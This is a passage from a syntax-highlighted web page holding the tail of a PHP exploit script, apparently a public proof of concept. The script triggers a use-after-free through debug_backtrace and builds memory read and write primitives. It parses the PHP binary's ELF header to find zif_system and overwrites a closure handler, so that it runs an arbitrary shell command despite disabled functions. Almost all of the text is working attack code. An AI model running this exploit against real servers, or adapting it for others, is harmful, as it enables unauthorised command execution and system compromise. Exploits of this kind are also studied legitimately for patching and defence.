            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ptr</span> <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$v</span> <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>
        <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 

            <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>
            <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> 
            <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>

        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

    <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$vuln</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> 
<span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>
<span class="token variable">$helper</span><span class="token operator">-&gt;</span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>

<span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-&gt;</span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

